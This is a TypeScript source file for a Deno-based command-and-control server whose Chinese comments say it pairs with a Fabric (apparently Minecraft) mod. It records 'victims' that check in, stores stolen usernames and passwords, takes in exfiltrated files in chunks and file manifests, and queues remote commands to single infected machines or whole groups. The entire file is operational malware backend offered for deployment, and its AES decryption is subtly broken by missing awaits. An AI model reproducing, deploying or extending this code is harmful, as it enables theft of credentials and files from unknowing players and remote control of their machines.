#!/usr/bin/env -S deno run --allow-net --allow-env
/**
 * ============================================================
 * Demo C2 Server —— Deno Deploy 适配版
 * ------------------------------------------------------------
 * 本地运行：
 *   deno run -A deno_deploy.ts
 *
 * 部署到 Deno Deploy：
 *   1. 新建 https://dash.deno.com/projects → 从 GitHub 导入
 *   2. 入口文件填 deno_deploy.ts
 *   3. 设置环境变量 ADMIN_TOKEN（管理鉴权）+ C2_AES_KEY（32字节hex）
 *   4. 启 Deno KV 存储（KV 默认自动挂载：Deno.openKv()）
 *
 * 与 Python 版接口完全对齐：
 *   GET  /beat?id=<fid>&task=<state>
 *   POST /upload                   (明文 JSON 或 {fid, nonce, data} AES)
 *   POST /manifest                 ({fid, ts, manifest})
 *   GET  /admin/victims
 *   GET  /admin/creds?limit=N
 *   GET  /admin/manifests?fid=xxx
 *   GET  /admin/manifests/<id>
 *   GET  /admin/groups
 *   POST /admin/groups/<gid>/send?cmd=&data=
 *   GET  /admin/blacklist
 *   POST /admin/blacklist?type=fid&value=
 *
 * 注意：Deno Deploy 是 HTTPS 自动 + 无文件系统 + KV 存储。
 * Fabric 模组里 C2_URL 需要改成 Deno Deploy 分配的域名。
 * ============================================================
 */

// ---------- 配置（全部从环境变量读，Deno Deploy 面板设置）----------
const ADMIN_TOKEN = Deno.env.get("ADMIN_TOKEN") ?? "";          // 空 = 调试模式（不鉴权，生产必须设）
const AES_KEY_HEX = Deno.env.get("C2_AES_KEY")  ?? "00".repeat(32);
const HOST        = Deno.env.get("HOST")        ?? "0.0.0.0";
const PORT        = Number(Deno.env.get("PORT") ?? 8443);
const PLAIN_MODE  = (Deno.env.get("PLAIN_MODE") ?? "true") === "true";

// Deno KV（官方内建，免费 1GB）
const KV = await Deno.openKv();

// ---------- AES-GCM ----------
function aesKey(): CryptoKey {
    const bytes = hexToBytes(AES_KEY_HEX);
    return crypto.subtle.importKey("raw", bytes, { name: "AES-GCM" }, false, ["decrypt"]);
}
function hexToBytes(hex: string): Uint8Array {
    const out = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) out[i/2] = parseInt(hex.substr(i, 2), 16);
    return out;
}
function decryptPayload(nonceB64: string, dataB64: string): string {
    const nonce = base64Decode(nonceB64);
    const ct    = base64Decode(dataB64);
    const pt    = crypto.subtle.decrypt({ name: "AES-GCM", iv: nonce }, aesKey(), ct);
    return new TextDecoder().decode(pt);
}
function base64Decode(s: string): Uint8Array {
    const bin = atob(s);
    const out = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
}

// ---------- 黑名单 ----------
async function isBlacklisted(fid: string, hostname = ""): Promise<boolean> {
    const fids = await KV.list({ prefix: ["bl", "fid"] });
    for await (const e of fids) {
        if (e.key[2] === fid) return true;
    }
    if (hostname) {
        const hns = await KV.list({ prefix: ["bl", "host"] });
        for await (const e of hns) {
            const val = String(e.value).toLowerCase();
            if (hostname.toLowerCase().includes(val)) return true;
        }
    }
    return false;
}
async function blAdd(type: "fid" | "hostname", value: string) {
    await KV.set(["bl", type, value], 1);
}
async function blDel(type: "fid" | "hostname", value: string) {
    await KV.delete(["bl", type, value]);
}
async function blList(): Promise<{type: string, value: string}[]> {
    const out: {type: string, value: string}[] = [];
    for await (const e of KV.list({ prefix: ["bl"] })) {
        out.push({ type: String(e.key[1]), value: String(e.key[2]) });
    }
    return out;
}

// ---------- victims ----------
async function upsertVictim(fid: string, hostname = "", server = "") {
    const now = Math.floor(Date.now() / 1000);
    const existing = await KV.get<number[]>(["v", fid]);
    if (existing.value) {
        // [first_seen, last_seen, online]
        const [first] = existing.value;
        await KV.set(["v", fid], [first, now, 1, server || existing.value[3] || "", hostname || existing.value[4] || ""]);
    } else {
        await KV.set(["v", fid], [now, now, 1, server, hostname]);
    }
}
async function listVictims(): Promise<any[]> {
    const out: any[] = [];
    for await (const e of KV.list({ prefix: ["v"] })) {
        const [first, last, online, server, hostname] = e.value as number[];
        out.push({ fid: e.key[1], first_seen: first, last_seen: last, online, server, hostname });
    }
    out.sort((a, b) => b.last_seen - a.last_seen);
    return out;
}

// ---------- credentials ----------
let credCounter = (await KV.get<number>(["ctr", "cred"])).value ?? 0;
async function insertCred(fid: string, items: any[]) {
    const now = Math.floor(Date.now() / 1000);
    for (const it of items) {
        const pwd = it.pwd ?? it.password ?? "";
        if (!pwd) continue;
        credCounter++;
        await KV.set(["ctr", "cred"], credCounter);
        await KV.set(["cred", credCounter], {
            id: credCounter, fid,
            ts: it.ts ?? now,
            srv: it.srv ?? it.server ?? "",
            usr: it.usr ?? it.user ?? "",
            pwd,
            raw: it.raw ?? "",
        });
    }
}
async function listCreds(limit = 200): Promise<any[]> {
    const all: any[] = [];
    for await (const e of KV.list({ prefix: ["cred"] })) {
        all.push(e.value);
    }
    return all.sort((a, b) => b.ts - a.ts).slice(0, limit);
}

// ---------- manifests ----------
let manifestCounter = (await KV.get<number>(["ctr", "mf"])).value ?? 0;
async function insertManifest(fid: string, ts: number, manifest: string): Promise<number> {
    manifestCounter++;
    await KV.set(["ctr", "mf"], manifestCounter);
    await KV.set(["mf", manifestCounter], { id: manifestCounter, fid, ts, manifest });
    return manifestCounter;
}
async function listManifests(fidFilter?: string, limit = 100): Promise<any[]> {
    const all: any[] = [];
    for await (const e of KV.list({ prefix: ["mf"] })) {
        const v = e.value as any;
        if (fidFilter && v.fid !== fidFilter) continue;
        all.push({ id: v.id, fid: v.fid, ts: v.ts, size_bytes: String(v.manifest).length });
    }
    return all.sort((a, b) => b.ts - a.ts).slice(0, limit);
}
async function getManifest(id: number): Promise<any | null> {
    const e = await KV.get<any>(["mf", id]);
    return e.value;
}

// ---------- groups（按 server 自动分群 + 预设正则）----------
async function autoAssignGroups(fid: string, server: string) {
    if (await isBlacklisted(fid)) return;
    // 取所有预设群的正则
    const presets = await KV.list({ prefix: ["grp", "preset"] });
    for await (const e of presets) {
        const { matched } = e.value as any;
        if (!matched) continue;
        try {
            const re = new RegExp(matched, "i");
            if (server && re.test(server)) {
                await KV.set(["gv", e.key[2], fid], 1);
            }
        } catch {}
    }
    // 按 server 自动群
    if (server) {
        const gid = "svr_" + server.toLowerCase().replace(/[^a-z0-9_]/g, "_").slice(0, 40);
        await KV.set(["grp", "auto", gid], { group_id: gid, name: server, matched: "" });
        await KV.set(["gv", gid, fid], 1);
    }
}
async function listGroups(): Promise<any[]> {
    const counts: Record<string, number> = {};
    for await (const e of KV.list({ prefix: ["gv"] })) {
        const gid = String(e.key[1]);
        counts[gid] = (counts[gid] || 0) + 1;
    }
    const out: any[] = [];
    for await (const e of KV.list({ prefix: ["grp"] })) {
        const g = e.value as any;
        out.push({ ...g, victim_count: counts[g.group_id] ?? 0 });
    }
    return out.sort((a, b) => (b.victim_count ?? 0) - (a.victim_count ?? 0));
}
async function groupVictims(gid: string): Promise<any[]> {
    const fids: string[] = [];
    for await (const e of KV.list({ prefix: ["gv", gid] })) {
        fids.push(String(e.key[2]));
    }
    const out: any[] = [];
    for (const fid of fids) {
        const e = await KV.get<number[]>(["v", fid]);
        if (e.value) {
            const [first, last, online, server, hostname] = e.value;
            out.push({ fid, first_seen: first, last_seen: last, online, server, hostname });
        }
    }
    return out.sort((a, b) => b.last_seen - a.last_seen);
}

// ---------- commands ----------
let cmdCounter = (await KV.get<number>(["ctr", "cmd"])).value ?? 0;
async function queueCmd(fid: string, cmd: string, data: string) {
    cmdCounter++;
    await KV.set(["ctr", "cmd"], cmdCounter);
    await KV.set(["cmd", cmdCounter], { fid, cmd, data, sent: 0, ts: Math.floor(Date.now()/1000) });
}
async function popPendingCmd(fid: string): Promise<{cmd: string, data: string} | null> {
    for await (const e of KV.list({ prefix: ["cmd"] })) {
        const v = e.value as any;
        if (v.fid === fid && !v.sent) {
            v.sent = 1;
            await KV.set(e.key, v);
            return { cmd: v.cmd, data: v.data };
        }
    }
    return null;
}
async function queueForGroup(gid: string, cmd: string, data: string): Promise<number> {
    const fids: string[] = [];
    for await (const e of KV.list({ prefix: ["gv", gid] })) fids.push(String(e.key[2]));
    for (const f of fids) await queueCmd(f, cmd, data);
    return fids.length;
}

// ---------- HTTP 路由 ----------
Deno.serve({ port: PORT, hostname: HOST ?? "0.0.0.0" }, async (req) => {
    const url = new URL(req.url);
    const p   = url.pathname;

    // --- /beat ---
    if (p === "/beat" && req.method === "GET") {
        const fid  = url.searchParams.get("id")  ?? "";
        const task = url.searchParams.get("task") ?? "";
        if (!fid) return json(400, { cmd: "noop", data: "" });

        if (await isBlacklisted(fid)) return json(200, { cmd: "noop", data: "" });
        await upsertVictim(fid);
        const cmd = await popPendingCmd(fid);
        return json(200, cmd ?? { cmd: "noop", data: "" });
    }

    // --- /upload ---
    if (p === "/upload" && req.method === "POST") {
        const raw = await req.text();
        let outer: any;
        try { outer = JSON.parse(raw); } catch { return json(400, { ok: false, error: "bad json" }); }

        const fid   = outer.fid ?? "";
        const nonce = outer.nonce ?? "";
        const data  = outer.data  ?? "";

        let plain: string;
        if (!fid || !data || PLAIN_MODE) {
            plain = raw;  // 明文兜底
        } else {
            try { plain = decryptPayload(nonce, data); } catch { plain = ""; }
        }

        let batch: any[];
        try {
            const pj = JSON.parse(plain);
            batch = Array.isArray(pj) ? pj : [pj];
        } catch { batch = []; }

        let lastServer = "";
        for (const it of batch) if (it.srv || it.server) lastServer = it.srv || it.server;
        await insertCred(fid, batch);
        if (fid && lastServer) {
            await autoAssignGroups(fid, lastServer);
            await upsertVictim(fid, "", lastServer);
        }
        return json(200, { ok: true, inserted: batch.length });
    }

    // --- /manifest ---
    if (p === "/manifest" && req.method === "POST") {
        const raw = await req.text();
        let outer: any;
        try { outer = JSON.parse(raw); } catch { return json(400, { ok: false, error: "bad json" }); }

        const fid = outer.fid ?? "";
        const mf  = outer.manifest ?? "";
        if (!fid || !mf) return json(400, { ok: false, error: "fid and manifest required" });

        await insertManifest(fid, outer.ts ?? Math.floor(Date.now()/1000), mf);
        await upsertVictim(fid);
        return json(200, { ok: true });
    }

    // --- /file  (小文件直接存 + 大文件元数据) ---
    if (p === "/file" && req.method === "POST") {
        const raw = await req.text();
        let o: any;
        try { o = JSON.parse(raw); } catch { return json(400, { ok: false, error: "bad json" }); }

        const fid = o.fid ?? "";
        if (!fid) return json(400, { ok: false });
        const relPath = o.path ?? "";
        const size    = Number(o.size ?? 0);
        const mtime   = Number(o.mtime ?? 0);
        const sha256  = o.sha256 ?? "";
        const mode    = o.mode ?? "full";
        const cB64    = o.content_b64 ?? "";

        if (mode === "full" && cB64) {
            // 小文件内容直接存 KV（Base64 后 <64KB 就能装下）
            try {
                const bin = atob(cB64);
                const capK = ["fcap", fid, relPath];  // 按路径归档
                const capR = ["fraw", fid, crypto.randomUUID()];
                await KV.set(capK, { path: relPath, size, sha256, mode: "full", ref: capR.join("/") });
                await KV.set(capR, { content: cB64, size: bin.length, sha256 });
                await upsertVictim(fid);
                return json(200, { ok: true });
            } catch { return json(500, { ok: false }); }
        }

        if (mode === "meta_only") {
            // 大文件只存元数据
            await KV.set(["fm", fid, relPath], {
                path: relPath, size, sha256, mtime,
                mode: "meta_only", ts: Math.floor(Date.now()/1000),
            });
            await upsertVictim(fid);
            return json(200, { ok: true });
        }

        return json(400, { ok: false, error: "mode or content missing" });
    }

    // --- /file/part  (大文件分片三件套) ---
    if (p === "/file/part" && req.method === "POST") {
        const raw = await req.text();
        let o: any;
        try { o = JSON.parse(raw); } catch { return json(400, { ok: false, error: "bad json" }); }

        const fid  = o.fid ?? "";
        const fileId = o.file_id ?? "";
        const action = o.action ?? "";
        if (!fid || !fileId) return json(400, { ok: false });

        const metaKey = ["fp", fid, fileId, "meta"];

        if (action === "start") {
            await KV.set(metaKey, {
                file_id: fileId,
                path: o.path ?? "",
                size: Number(o.size ?? 0),
                sha256: o.sha256 ?? "",
                total: Number(o.total ?? 0),
                ts: Math.floor(Date.now()/1000),
            });
            await upsertVictim(fid);
            return json(200, { ok: true });
        }

        if (action === "piece") {
            const idx  = Number(o.idx ?? 0);
            const total = Number(o.total ?? 0);
            const cB64 = o.content_b64 ?? "";
            // 每片 < 32KB base64 ≈ 43KB，Deno KV 64KB 限制内
            await KV.set(["fp", fid, fileId, String(idx)], {
                idx, total, content: cB64,
            });
            return json(200, { ok: true, idx });
        }

        if (action === "end") {
            const meta = (await KV.get<any>(metaKey)).value;
            if (!meta) return json(400, { ok: false, error: "start not found" });
            await KV.set(["fp", fid, fileId, "done"], {
                file_id: fileId, path: meta.path, size: meta.size,
                sha256: meta.sha256, parts: meta.total,
                ts: Math.floor(Date.now()/1000),
            });
            return json(200, { ok: true });
        }

        return json(400, { ok: false, error: "unknown action" });
    }

    // --- 管理接口（全部强制鉴权）---
    if (p.startsWith("/admin")) {
        if (ADMIN_TOKEN && req.headers.get("X-Admin-Token") !== ADMIN_TOKEN) {
            return json(403, { error: "forbidden", hint: "X-Admin-Token wrong/missing" });
        }
        return handleAdmin(req, url);
    }

    return json(404, { error: "not found" });
});

// ---------- 管理路由 ----------
async function handleAdmin(req: Request, url: URL): Promise<Response> {
    const p   = url.pathname.replace("/admin", "");
    const qs  = url.searchParams;
    const m   = req.method;

    // GET /
    if (m === "GET" && (p === "" || p === "/victims"))  return json(200, await listVictims());
    if (m === "GET" && p === "/creds")                  return json(200, await listCreds(+qs.get("limit")! || 200));
    if (m === "GET" && p === "/manifests") {
        return json(200, await listManifests(qs.get("fid") ?? undefined, +qs.get("limit")! || 100));
    }
    if (m === "GET" && p.startsWith("/manifests/")) {
        const id = +p.replace("/manifests/", "");
        const mf = await getManifest(id);
        if (!mf) return json(404, { error: "not found" });
        let parsed: any = mf.manifest;
        try { parsed = JSON.parse(mf.manifest); } catch {}
        return json(200, { ...mf, manifest: parsed });
    }
    if (m === "GET" && p === "/groups")      return json(200, await listGroups());
    if (m === "GET" && p === "/blacklist")   return json(200, await blList());
    if (m === "GET" && p === "/stats") {
        const vc = (await listVictims()).length;
        const cc = (await listCreds(1e9)).length;
        const gc = (await listGroups()).length;
        const bc = (await blList()).length;
        return json(200, { victims: vc, creds: cc, groups: gc, blacklist_size: bc });
    }

    // POST
    if (m === "POST" && p === "/send") {
        const fid  = qs.get("fid")  ?? "";
        const cmd  = qs.get("cmd")  ?? "noop";
        const data = qs.get("data") ?? "";
        if (!fid) return json(400, { ok: false, error: "fid required" });
        await queueCmd(fid, cmd, data);
        return json(200, { ok: true, queued: 1 });
    }
    if (m === "POST" && p === "/blacklist") {
        const t = qs.get("type") ?? "";
        const v = qs.get("value") ?? "";
        if (t !== "fid" && t !== "hostname") return json(400, { ok: false });
        await blAdd(t, v);
        return json(200, { ok: true });
    }
    if (m === "GET" && p.startsWith("/groups/") && p.endsWith("/victims")) {
        const gid = p.slice("/groups/".length, -"/victims".length);
        return json(200, await groupVictims(gid));
    }
    if (m === "POST" && p.startsWith("/groups/") && p.endsWith("/send")) {
        const gid = p.slice("/groups/".length, -"/send".length);
        const cmd  = qs.get("cmd")  ?? "noop";
        const data = qs.get("data") ?? "";
        const n = await queueForGroup(gid, cmd, data);
        return json(200, { ok: true, queued: n });
    }

    // DELETE
    if (m === "DELETE" && p === "/blacklist") {
        const t = qs.get("type") ?? "";
        const v = qs.get("value") ?? "";
        await blDel(t, v);
        return json(200, { ok: true });
    }

    return json(404, { error: "unknown admin route" });
}

function json(code: number, obj: any): Response {
    return new Response(JSON.stringify(obj), {
        status: code,
        headers: { "Content-Type": "application/json; charset=utf-8" },
    });
}
